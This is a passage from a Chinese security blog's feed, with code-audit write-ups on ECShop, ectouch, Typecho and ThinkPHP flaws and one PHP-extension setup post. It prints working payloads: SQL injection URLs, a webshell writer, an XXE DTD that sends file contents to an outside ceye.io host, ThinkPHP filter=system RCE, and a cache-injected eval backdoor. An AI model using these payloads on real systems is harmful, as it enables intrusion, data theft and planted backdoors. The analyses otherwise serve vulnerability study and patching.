补丁修复补丁增加了对meta_input的过滤，将其从post中移除。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows+apache+php7.0安装php扩展之imagick踩过的大坑]]></title>
    <url>%2Fwindows-apache-php7-0%E5%AE%89%E8%A3%85php%E6%89%A9%E5%B1%95%E4%B9%8Bimagick%E8%B8%A9%E8%BF%87%E7%9A%84%E5%A4%A7%E5%9D%91%2F</url>
    <content type="text"><![CDATA[0x00 前言在安装之前还特意在manual上查看了一下安装过程下载dll-&gt;copy到php扩展目录-&gt;添加配置到php.ini然而事情并没有那么简单– 0x01 踩坑之旅上述方法无效后就开始了愉快的网上冲浪环节，在前人的记录中，找到需要安装ImageMagick控件。然而安装后还是出现运行php -m还是出现了无法加载模块的错误然后又有前人记载，可能是imagemakick版本太高的原因，然后又进行降级安装，此时又爆出弹窗错误，提示无法定位到dll。其中部分环节过于血腥忘记了一部分。 0x02 正确姿势 首先下载安装ImageMagick-6.7.5-0-Q8-windows-dllhttps://ftp.icm.edu.pl/packages/ImageMagick/binaries/ 建议版本不要过高，安装时采用默认安装便会将目录添加到环境变量。 将目录下的所有 CORE_RL_*.dll复制到apache/bin目录下 下载php扩展imagickhttp://pecl.php.net/package/imagick/3.4.1/windows，按照需要选择版本 将解压后目录内的php_imagick.dll放到php扩展目录ext下 添加extension=php_imagick.dll到php.ini文件 将目录内的八个CORE_RL_*.dll文件复制到php.exe所在目录 重启apache,必要条件下需要重启计算机。查看phpinfo当$_SERVER[&#39;PATH&#39;]中不包含ImageMagick的环境变量时重启 运行php -m| findstr imagick或者php -i | findstr imagick或者phpinfo()查看是否成功0x03 成功截图 php -i| findstr imagick phpinfo]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ECShop2.x 从sql注入到代码执行]]></title>
    <url>%2FECShop2-x-%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[0x00 漏洞成因根源是user.php中模板变量可控，导致sql注入，配合注入实现任意代码执行。 0x01 漏洞分析sql注入分析首先查看漏洞触发点,这里back_act来自于REFERER，用户可控。继续往下跟，可发现back_act变量进入了assert函数，该方法用于模板变量注册。然后跟进到display方法。display用于将模板显示出来。 首先进入fech方法。在该方法中，进入到template_out方法进行模板变量解析。其中前边注册的back_act变量会解析到模板中。 最终out返回为解析变量后html页面内容，其back_act处内容用户可控。 在display方法中，继续向下执行，判断 _echash是否在out中，并以_echash对out进行分割，因为这里_echash值固定，所以这里是可控的。分隔后的内容继续进入到insert_mod方法中。继续跟进。这里函数用来处理动态内容，在最后可以看到动态函数调用，而传进来的name变量以|分隔，后半部分反序列化后作为动态函数的参数，前边部分与insert_拼接作为函数名。那么只需要继续找到可利用的函数即可。这里找到insert_ads这个函数，可以看到arr[‘id’]跟[‘num’]直接被拼接到sql语句中。而这个arr变量即为我们前边可控的反序列化得到的内容。所以这里造成sql注入。所以这里sql注入payload形式为123REFERER = _echash+ads|serialize(array('num'=&gt;sql_payload,'id'=&gt;2))REFERER = 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";s:3:"boo";&#125; 成功注入sql语句 代码执行在上面基础上我们继续往下分析。这里position_style变量取的是‘str:’与sql语句执行的内容$position_style = $row[‘position_style’];拼接结果。这部分sql执行内容是可以通过前面所分析的sql注入可控的。其被带进fetch方法，继续跟踪。因为position_style在上面与str:拼接，所以进入fetch后会进入到执行_eval函数的分支。 _eval函数中调用了eval方法 在此之前，用户可控的filename变量进入fetch_str中继续字符串过滤操作，跟进查看。 source中内容1&#123;$asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp'));//&#125;xxx 在最后preg_replace会匹配{([^}{\n]*)}在/e修饰符下执行$this-&gt;select(‘\1’);其中带入的参数即为前面正则匹配到的内容。1preg_replace("/&#123;([^\&#125;\&#123;\n]*)&#125;/e", "\$this-&gt;select('\\1');", $source); 之后会依次进入select-&gt;get_val-&gt;make_var,最终payload闭合make_var中字符串即可从变量从逃逸。首先进入select方法，要想返回内容可控，要让tag[0]==’$’，然后继续跟到get_val方法。进入到get_val后，发现当字符串中不存在.$进入make_var方法处理，继续跟进。可以看到在make_var方法中最终进行了拼接处理，只需要将前面闭合，后面注释掉即可。 在此为止，最终在fetch_str处理后的字符串格式为1&lt;?php echo $this-&gt;_var['payload'];?&gt;//这里payload只需将前面闭合即可执行任意代码 根据前面分析，进入fetch_str处理的字符串即position_style的内容为1&#123;$ads'];payload//&#125; //这里payload为想要执行的任意代码 因为position_style变量取自sql查询的position_style字段。结合前面的注入漏洞,使用union select 控制字段内容arr[id]传入‘/*’,arr[num]传入/ union select 1,2,3,4,5,6,7,8,9,10 – -即可将中间的order by 注释掉实现union select1SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM `ecshop27`.`ecs_ad` AS a LEFT JOIN `ecshop27`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time &lt;= '1535678679' AND end_time &gt;= '1535678679' AND a.position_id = ''/*' ORDER BY rnd LIMIT */ union select 1,2,3,4,5,6,7,8,9,10-- - 另外为了让程序继续执行下面的代码，这里需满足条件最终payload1REFERER:554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";&#125; 参考链接ecshop2.x 代码执行]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python格式化字符串漏洞]]></title>
    <url>%2Fpython%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 前言在python2.6之后，引入了format格式化字符串的方法，极大的扩展了%格式化字符串的形式。它甚至可以访问对象的属性和数据项，这导致字符串在用户可控的的条件下，将产生安全问题。 0x01 简单例子1234567891011secert = 'I_love_python'class User(): def __init__(self,name,password): self.name = name self.password = password user = User('boogle','l3oog1e_Password')email = '&#123;user.password&#125;,&#123;user.__class__.__init__.__globals__&#125;'info = 'Hello ,&#123;user.name&#125;'+' your email is '+emailprint info.format(user=user) 假设上面代码中email内容用户可控，使用上面构造的字符串后,发现带出来敏感数据。1Hello ,boogle your email is l3oog1e_Password,&#123;'info': 'Hello ,&#123;user.name&#125; your email is &#123;user.password&#125;,&#123;user.__class__.__init__.__globals__&#125;', 'secert': 'I_love_python', '__builtins__': &lt;module '__builtin__' (built-in)&gt;, '__file__': 'C:\\Users\\14737\\Desktop\\format.py', '__package__': None, 'email': '&#123;user.password&#125;,&#123;user.__class__.__init__.__globals__&#125;', 'User': &lt;class __main__.User at 0x02D41DC0&gt;, '__name__': '__main__', '__doc__': None, 'user': &lt;__main__.User instance at 0x02D55508&gt;&#125; 0x02 构造利用链在上面的实例中，我们带出来两种数据，一种是方法内的局部变量，一种是类外的全局变量。可以看到带出局部变量构造比较简单，而带出全局变量比较复杂，而在实际环境中带出敏感信息则更为复杂，这里介绍几个常用的方法。 bases 返回一个类直接所继承的类（元组形式 mro 也是返回一个类直接所继承的类 class 返回一个实例所属的类 globals 用于函数，返回一个当前空间下能使用的模块，方法和变量的字典 subclasses() 获取一个类的子类，返回的是一个列表 0x03 ctf题目下面使用百越杯中的一个web题目演示上面利用链的使用方法。 搭建环境题目源码：easy flask 1234567修改工作目录即文件夹名为flaskr然后启动flask application,首先设置环境变量set FLASK_APP = __init__.py //powershell命令为：$env:FLASK_APP = "__init__.py"初始化数据库flask init-db运行flask run 代码审计这里只查看格式化字符串漏洞导致信息泄露部分，全局搜索format123456789101112131415161718192021222324@bp_secert.route('/views',methods = ['GET','POST'])@login_checkdef views_info(): view_id = request.args.get('id') if not view_id: view_id = session.get('user_id') user_m = user.query.filter_by(id=view_id).first() if user_m is None: flash(u"该用户未注册") return render_template('secert/views.html') if str(session.get('user_id'))==str(view_id): secert_m = secert.query.filter_by(id=view_id).first() secert_t = u"&lt;p&gt;&#123;secert.secert&#125;&lt;p&gt;".format(secert = secert_m) else: secert_t = u"&lt;p&gt;***************************************&lt;p&gt;" name = u"&lt;h1&gt;name:&#123;user_m.username&#125;&lt;h1&gt;" email = u"&lt;h2&gt;email:&#123;user_m.email&#125;&lt;h2&gt;" info = (name+email+secert_t).format(user_m=user_m) return render_template('secert/views.html',info = info) 在view_info函数中可以看到secret_m内容首先进入到secret_r然后又带入格式化的字符串中，这里secret_m为数据库secert表内容，继续往下看，可以看到该表中内容来自用户edit页面编辑1234567891011121314151617@bp_secert.route('/edit',methods = ['GET','POST'])@login_checkdef edit_secert(): if request.method=='POST': secert_new = request.form.get('secert') error = None if not secert_new: error = u'请输入你的秘密' if error is None: secert.query.filter_by(id = session.get('user_id')).update(&#123;'secert':secert_new&#125;) db.session.commit() return redirect(url_for('secert.views_info')) flash(error) return render_template('secert/edit.html') 所以，secert_m内容可控，即最终格式化字符串的内容可控，即存在我们上面所说的问题。1info = (name+email+secert_t).format(user_m=user_m) 这里format()方法中，传入参数user_m，则前面字符串中也应为{user_m}形式，否则会报错。 构造利用链首先确定函数为user_m,向上查看。123```class user(db.Model): ....//省略类内容 在该类中没有我们想要的内容，可以看到user类继承自db.Model。那么可以使用base获取。db.Model是SQLAlchemy的实例。而db使用了current_app进行了配置12345def init_db(): db = sqlite3.connect( current_app.config['DATABASE'], detect_types=sqlite3.PARSE_DECLTYPES ) 而current_app中有用于生成用户session的SECRET_KEY，所以我们可以用这条链进行获取。1&#123;user_m.__class__.__base__.__class__.__init__.__globals__[current_app].config&#125; 获取到secret_key便可进行session伪造 利用脚本https://github.com/noraj/flask-session-cookie-manager1python3 .\session_cookie_manager.py encode -s 'test' -t "&#123;'user_id': 5&#125;"]]></content>
      <categories>
        <category>python安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ectouch2 微信支付xxe漏洞]]></title>
    <url>%2Fectouch2-%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98xxe%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 前言之前有了解过xxe漏洞，但没有在实际环境中分析过，这次刚好看到大佬发的Ectouch2.0 分析代码审计流程 (五) xxe漏洞，也跟入学习一波。 0x01 漏洞分析根据文中介绍，定位到wxpay.php的notify方法，可以看到在该方法中，用户可控的inputdata变量直接进入到simplexml_load_string()函数中，那么这里便可能存在xxe漏洞。 搜索全文，查看哪里用到了该方法。找到respond控制器的index方法，该方法中，payobj对象取决于this-&gt;data[‘code’],而且要进入分支还要求this-&gt;data[‘type’]==’notify’,查看其是否可控。可以看到这两个变量均可以通过get方法来控制。 另外漏洞利用上面判断是否存在通过get.code传入的wxpay插件，因为需要后台启用该插件。 另外由于在notify方法并未对数据进行输出，因此该漏洞为bind xxe，为了测试方便，我们先将数据进行输出。 下面便是构造payload，看看如何才能执行到这里。ectouch采用MVC模式，入口文件index.php中包含了/include/bootstrap.php继续跟进，62行看到路由解析函数urlRoute 最终定位到display方法获取到其模块控制器方法，分别使用吗m,c,a传入 至此便可构造pyload123456789?m=default&amp;c=respond&amp;a=index&amp;code=wxpay&amp;type=notifypost&lt;?xml version="1.0"?&gt; &lt;!DOCTYPE foo [&lt;!ENTITY xxe "xxe test"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; 至此xxe漏洞确实存在了，但如何利用这个bind xxe呢，总不能让其自己加上输出语句吧。 使用payload12345&lt;?xml version="1.0"?&gt; &lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://127.0.0.1/xxe.dtd"&gt;%remote;%int;%send;]&gt; 上面payload中外部dtd文件 xxe.dtd内容为12&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///f:/data.txt"&gt;&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://ay82rc.ceye.io/?p=%file;'&gt;"&gt; 成功读到数据 参考一篇文章带你理解漏洞之 XXE 漏洞]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Typecho 反序列化漏洞分析]]></title>
    <url>%2FTypecho-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x01 前言Typecho install.php中存在反序列化漏洞，导致远程代码执行。 0x02 漏洞分析漏洞产生位置 漏洞产生在安装文件中，而前面代码只是做了简单的安装判断和跨站请求过滤，只需要对finish，REFEREER进行构造即可绕过。 接着向下分析，这里反序列化的参数是可以直接通过cookie或者post由用户控制的，所以我们只需要找到可利用的方法即可。 我们知道反序列化是将一个休眠对象(字符串)激活为一个对象，激活过程中会调用几种方法，我们只需要找到能够利用的方法即可。这里主要方法有123__wakeup()__construct()__toString() 对前两种方法进行全局搜索后均没有找到可以利用的地方。__toString()方法在类被做字符串处理时会被调用，如字符串拼接、输出操作等。而下面在创建新的Typecho_Db对象时，其构造函数中刚好对反序列化的内容进行了字符串拼接操作，给toString方法的利用带来了可能。但是在搜索toString方法时，因为水平不足并没有发现可以利用的点，这里向各位大神表示敬佩。在Typecho_Feed的toString方法中第358行$item[‘author’]调用screenName属性，如果该实例化对象用于从不可访问的属性读取数据，便会触发get()魔术方法。那么便可以进一步搜索__get()方法。 然后找到Typecho_Request类中的__get方法继续跟踪get最终在_applyFilter方法中找到可以利用的点，call_user_func 12345678910111213141516171819202122232425262728//exp&lt;?phpclass Typecho_Feed&#123; private $_type = 'ATOM 1.0'; private $_charset = 'UTF-8'; private $_lang = 'zh'; private $_items = array(); public function addItem(array $item) &#123; $this-&gt;_items[] = $item; &#125;&#125;class Typecho_Request&#123; private $_params = array('screenName'=&gt;'file_put_contents(\'info.php\', \'&lt;?php phpinfo();?&gt;\')'); private $_filter = array('assert');&#125;$feed = new Typecho_Feed();$req = new Typecho_Request();$feed-&gt;addItem(array('author'=&gt;$req));$exp=array('adapter'=&gt;$feed,'prefix'=&gt;'typecho_');echo base64_encode(serialize($exp));?&gt; 0x03 修复方法删除install.php]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphp5 Request 远程代码执行漏洞分析]]></title>
    <url>%2Fthinkphp5-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[影响版本根据thinkphp发布的5.0.24的补丁可以看到问题出在核心类Request的method方法。补丁增加了对传入的$method的限制。123漏洞影响的产品版本包括：ThinkPHP 5.0.x ~ 5.0.23版 漏洞分析本文以5.0.5 full版本进行分析 这里Config::get(‘var_method’)获取到的内容为_method,被称为表单请求类型伪装变量，具体功能不细究，可查阅官方文档了解。 那么在未打补丁之前对POST进来的_method变量未作任何过滤，而且下面直接进行了调用，而且函数参数可控。那么便可实现对本类所有方法的调用。1$this-&gt;($this-&gt;method)($_POST); 根据payload，其传入的是_method = __construct查看__construct方法 该方法对传入的参数数组进行遍历，并通过property_exists检查对象或类是否具有该属性。如果是本类的属性，则通过$this-&gt;$name = $item对属性进行重新赋值。那么这里因为传入的参数可控，可实现对Requset类下任意属性的覆盖。 单单一个变量覆盖是不能得到满足的，继续将这个漏洞扩大化。可以查看可以覆盖的属性，并看看这些属性的覆盖会不会引起更致命的操作。这是其中一部分属性而通过已知的payload了解到这里的全局过滤规则filter被覆盖。查看哪里用到了filter,搜索后发现该类中很多方法都用到了这个变量其中input方法中调用了filterValue方法而filterValue方法中，将其带入了call_user_func函数，这里还有一个参数value,向上跟踪value来自于input方法的data,继续往上查看到哪里调用了input。发现了param方法，data来自于其$this-&gt;param12// 当前请求参数和URL地址中的参数合并$this-&gt;param = array_merge($this-&gt;get(false), $vars, $this-&gt;route(false)); 其中$vars数组来自上面，也即我们通过http传入的参数 到此为止，call_user_func的两个变量我们均可以控制，便可以实现任意代码执行。 其中这里要想任意代码执行有两个条件： 1.调用method()实现filter变量覆盖 2.调用param()方法，实现任意代码执行链 首先是第一条在检测url路由check()中触发 整个调用链运行时自动加载 而第二个条件。全局搜索漏洞触发点，看看哪里调用了param方法。其中当开启debug时调用param。 当debug关闭时，继续搜索其他触发点。这里当dispatch[‘type’]==’method’时，触发param方法向上跟踪dispatch 最终还是与$request-&gt;method()有关而method方法返回的method是可以覆盖掉的，可以post传递method=get控制dispatch的最终值，从而进入method分支，调用param 0x02 payload最终payload123post:_method=__construct&amp;method=get&amp;filter=system&amp;boo=whoami]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphp 缓存函数设计缺陷 getshell]]></title>
    <url>%2Fthinkphp-%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7-getshell%2F</url>
    <content type="text"><![CDATA[thinkphp 缓存函数设计缺陷 getshell 0x00 前言&amp;&amp;影响版本不能说是thinkphp漏洞，因为官方压根就没承认，按照官方手册配置使用这个缓存功能是没有任何问题的，但单从其缓存函数上看确实存在因为未加过滤引起的可能getshell。123影响版本thinkphp 3.2.3-5.0.10 0x01 利用条件以下分析仅在理想环境下用于本地漏洞复现，生产环境下咯多漏洞利用难度系数较高，需要满足以下几个条件 开启缓存功能 缓存文件所在目录可以从浏览器直接访问，因为缓存文件可能不部署在web目录 需要能够猜解出缓存的文件名（文件名生成有一定规律） 同时可以控制缓存文件里的内容（比如通过写入到数据库进而生成缓存文件） 0x02 分析过程以5.0.10版本为例。 生成新的Home模块1php think build --module home 123456789101112131415161718192021222324252627//demo&lt;?php namespace app\home\controller; use think\Controller; use think\Request; use think\View; use think\Url; use think\Session; use think\Db; use app\home\model\Test as t; use think\Cache; use app\home\model\Article as a;class Index extends Controller&#123; public function add()&#123; $post = input('post.'); $article = Db::name('articles')-&gt;insert($post); var_dump($article); &#125; public function Cache()&#123; $article = Db::name('articles')-&gt;field('*')-&gt;select(); Cache::set('name',$article,3600); &#125;&#125; Demo建好了，add()方法用于向数据库中插入数据，cache()方法用于缓存数据。下面开始分析代码。当访问下面的url调用cache方法时 1http://127.0.0.1/thinkphp_5.0.10_full/public/index.php/Home/index/cache 函数调用栈这里重点说一下 thinkphp\cache]driver\File下的set()方法 首先跟入getCacheKey方法可以看到，获取到的是缓存文件目录，其将缓存名称经过md5()，前两位作为目录名，后面的作为缓存文件名。 其通过$this-&gt;option[‘path’]获得目录前缀，其默认是在 Runtime/cache/,可以通过修改CACHE_PATH使缓存目录放在非web目录，从而避免漏洞被利用。 获取到缓存文件名之后继续向下运行，可以看到将要缓存的数据进行序列化之后直接拼接写入到了缓存目录，也就是这里的数据没有做任何过滤，所以出现了漏洞。这里的data虽然拼接到了注释语句中，但是因为没有任何过滤可以通过注入换行符跳出单行注释，而且序列化函数不会对换行符做任何处理。 那么我们便可以通过demo中的add()方法先向数据库存入payload数据中 然后访问cache方法，既可以看到paylaod进入到了缓存文件 12//payloadcontent=%2f%2f%0d%0a%24a%3deval(%24_POST%5b%27a3%27%5d)%3b%23 0x03 修复方法 完善框架中set()方法，在/thinkphp/library/think/cache/driver/File.php 中的set()函数中对于$value参数进行过滤，去除换行符号。添加代码$data = str_replace(PHP_EOL, ‘’, $data);但存在因为去除换行符导致的文本布局改变。 从上面的审计中可以知道文件名是由缓存索引的md5值决定的，所以可以设置复杂的缓存索引。 修改CHCHE_PATH,使缓存目录放在用户不可访问的地方。 从php的配置入手，关闭eval等危险函数。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphp 5.0.10 sql注入漏洞 支持子查询]]></title>
    <url>%2Fthinkphp-5-0-10-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-%E6%94%AF%E6%8C%81%E5%AD%90%E6%9F%A5%E8%AF%A2%2F</url>
    <content type="text"><![CDATA[0x00 前言&amp;&amp;影响版本在tp5 sql注入漏洞中，这个漏洞算是危害比较大的了，因为其他的sql注入一般不支持子查询。而这个漏洞只出现在5.0.10版本中，也算是将危害降到最低了。12漏洞影响版本thinkphp 5.0.10 0x01 漏洞成因那么为什么这个注入支持子查询呢。我们知道tp5重写了数据库操作类方法。而在5.0.10版本中，增加了NOT LIKE操作。可以看到进入这个分支后没有任何过滤，直接拼接到了whereStr变量，作为sql语句的一部分返回。而其他分支其实也没有做任何过滤，为什么增加了NOT LIKE后出现了漏洞呢？那是因为tp5的助手函数input()在输入数据时，进行了过滤操作。这里主要说filterExp()这里进行关键字匹配，当匹配到时在关键字后面添加空格。这样我们就不能控制上面进入相应的分支了，在函数中可以可以包括了很多能控制分支流程的关键字，却唯独没有NOT LIKE。那么说到这里我们也就明白了，漏洞的成因是在5.0.10版本数据库操作类方法中增加了NOT LIKE但是filterExp函数没有及时更正更新导致了sql注入。 0x02 测试demo1234567public function index() &#123; $data = input('get.name/a'); $sql_data = db('think_user')-&gt;where(array('username'=&gt;$data))-&gt;select(); var_dump($sql_data); &#125; 12payloadhttp://127.0.0.1/thinkphp_5.0.10_full/public/index.php/Index/index/index?name[0]=not%20like&amp;name[1][0]=123&amp;name[1][1]=6666&amp;name[2]=) and 1=2 union select 1,user(),3,4,id from think_user -- + 0x03 修补方法在filterExp()方法中增加NOT LIKE]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphp5.0.x sql注入分析]]></title>
    <url>%2Fthinkphp5-0-x-sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 影响版本12漏洞受影响的版本thinkphp 5.0.x &lt;= 5.0.15 0x01 漏洞分析首先看一下官方commit，可以看到补丁对val[1]进行了判断，之前未作处理直接进行了拼接。 根据补丁我们逆着分析，也就说只要控制了val[1],就能进行sql注入。补丁在parseData方法中，val[1]来自data，查看这个data是从哪里来的，找到调用parseData方法的地方。 可以看到有两处调用，分别查看一下 一个是该类下的update方法 一个是insert方法 那么可以猜测在执行数据库更新或者插入操作时可能存在注入。 这里以insert方法为例继续分析。根据上面的代码可以看到data直接带入到parseData中执行解析操作，那么我们继续向上追踪。找到Query类下的insert方法对其进行了传参并调用。 可以看到，这里的data就是调用insert方法时直接传入的参数，这里可以写一个简单的demo便于后续的操作和理解12345678910111213&lt;?phpnamespace app\index\controller;use think\Db;class Index&#123; public function index() &#123; $name = input("get.name/a"); Db::table("think_user")-&gt;where(["id"=&gt;1])-&gt;insert(["username"=&gt;$name]); return "ThinkPHP SQL Test."; &#125;&#125; 在这段demo中进入insert的是由get来的name是用户完全可控的。 到现在为止，我们已经知道上面提到的data是完全可以由用户控制的，那么我们回过头来，继续看看 漏洞是如何发生的。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152protected function parseData($data, $options) &#123; if (empty($data)) &#123; return []; &#125; // 获取绑定信息 $bind = $this-&gt;query-&gt;getFieldsBind($options['table']); if ('*' == $options['field']) &#123; $fields = array_keys($bind); &#125; else &#123; $fields = $options['field']; &#125; $result = []; foreach ($data as $key =&gt; $val) &#123; $item = $this-&gt;parseKey($key, $options); if (is_object($val) &amp;&amp; method_exists($val, '__toString')) &#123; // 对象数据写入 $val = $val-&gt;__toString(); &#125; if (false === strpos($key, '.') &amp;&amp; !in_array($key, $fields, true)) &#123; if ($options['strict']) &#123; throw new Exception('fields not exists:[' . $key . ']'); &#125; &#125; elseif (is_null($val)) &#123; $result[$item] = 'NULL'; &#125; elseif (is_array($val) &amp;&amp; !empty($val)) &#123; switch ($val[0]) &#123; case 'exp': $result[$item] = $val[1]; break; case 'inc': $result[$item] = $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]); break; case 'dec': $result[$item] = $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]); break; &#125; &#125; elseif (is_scalar($val)) &#123; // 过滤非标量数据 if (0 === strpos($val, ':') &amp;&amp; $this-&gt;query-&gt;isBind(substr($val, 1))) &#123; $result[$item] = $val; &#125; else &#123; $key = str_replace('.', '_', $key); $this-&gt;query-&gt;bind('data__' . $key, $val, isset($bind[$key]) ? $bind[$key] : PDO::PARAM_STR); $result[$item] = ':data__' . $key; &#125; &#125; &#125; return $result; &#125; 通过上面的代码就可以发现，switch分支根据val[0]进行选择，当进入到case ‘inc’时，val[1]进入了parseKey方法。但是跟踪parseKey发现，其对传入的参数未作任何处理直接返回 当传入payload,这里直接进行了拼接返回，并通过上面的一些列调用，执行了payload1http://127.0.0.1/thinkphp_5.0.14_full/public/index.php/index/index/index?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7e,database(),0x7e),1)&amp;name[2]=1 执行结果 0x02 后记但是这个漏洞比较鸡肋的是查询user() database()等，不能进行子查询。原因是因为thinkphp框架使用参数化查询PDO，将参数与查询语句分离，降低了漏洞风险，后门将会针对该框架的PDO进行分析。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphp 5.1.x order by注入分析]]></title>
    <url>%2Fthinkphp-5-1-x-order-by%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 影响版本123漏洞影响版本thinkphp5.1.x &lt; 5.1.23 0x01 漏洞分析首先看一下官方commit payload1http://127.0.0.1/thinkphp5.1-master/public/index.php?order[id`,%27boo%27)|%20updatexml(1,concat(0x3c,user(),0x3e),1)%23][]=1 由补丁可以看出，当val是数组时增加了对key的判断，那么问题应该出在未对key进行过滤，而key被带进入parseOrderField中，跟踪一下。这里getOptions()函数是获取了当前要查询的参数，getFieldsBind()函数是获取数据表绑定信息。查看最后的return语句,这里将val拼接到key的后面，那么这个val值其实是不用的，只要key值可控，就可以将后面的注释掉1return 'field(' . $this-&gt;parseKey($query, $key, true) . ',' . implode(',', $val) . ')' . $sort; 因为这里parseKey对key进行了处理，继续跟进。这里对key值进行了多重判断12345671. is_numeric判断，如果是数字，则返回，不是的话继续向下执行2. 判断$key是否属于Expression类3. strpos($key, '-&gt;') &amp;&amp; false ===strpos($key, '(') 4. ('*' != $key &amp;&amp; ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) 这里注入的sql语句进入了第四个判断,即将key用包裹。123if ('*' != $key &amp;&amp; ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) &#123; $key = '`' . $key . '`'; &#125; 然后回到上一层,进行拼接返回1return 'field(' . $this-&gt;parseKey($query, $key, true) . ',' . implode(',', $val) . ')' . $sort; 拼接得到 field(SQL注入语句,$val) 可以看到我们需要对`闭合并且注释掉后面的内容。 两外field()函数，field()函数必须指定大于等于两个字段才可以正常运行，否则就会报错。而且当field中的参数不是字符串或数字时，指定的参数必须是正确的表字段，否则程序就会报错。这里由于程序会在第一个字段中加 限制,所以必须指定正确的字段名称。第二个字段没有限制，可以指定字符串或数字。 那么payload 可以是1http://127.0.0.1/thinkphp5.1-master/public/index.php?order[id`,'boo')|%20updatexml(1,concat(0x3c,user(),0x3e),1)#][]=1 0x02 后记因为tp5 pdo的原因，还是不能进行子查询。 天融信关于ThinkPHP 5.1.x SQL注入漏洞分析]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphp5.x 远程代码执行漏洞]]></title>
    <url>%2Fthinkphp5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
